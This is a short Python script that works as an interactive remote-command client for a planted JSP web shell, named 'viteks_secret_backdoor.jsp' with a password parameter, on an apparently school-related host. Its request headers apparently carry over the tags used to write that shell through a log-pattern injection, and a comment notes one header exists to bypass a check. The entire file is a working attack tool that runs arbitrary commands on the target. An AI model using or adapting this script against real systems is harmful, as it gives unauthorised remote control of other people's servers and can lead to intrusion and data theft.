import requests


get_headers = {
    "prefix": "<%",
    "suffix": "%>//",
    # This may seem strange, but this seems to be needed to bypass some check that looks for "Runtime" in the log_pattern
    "c": "Runtime",
}

url = r"http://js.bischofberger.schule:18080/viteks_secret_backdoor.jsp?pwd=j&cmd="

def send(c:str)->str:
    ret = requests.get(url + c, headers=get_headers, verify=False)
    string = ret.content.decode()
    if string[:2] == '//':
        return ""
    else:
        return string.split('\x00')[0]

if __name__ == "__main__":
    while True:
        c = input("$ ")
        print(send(c))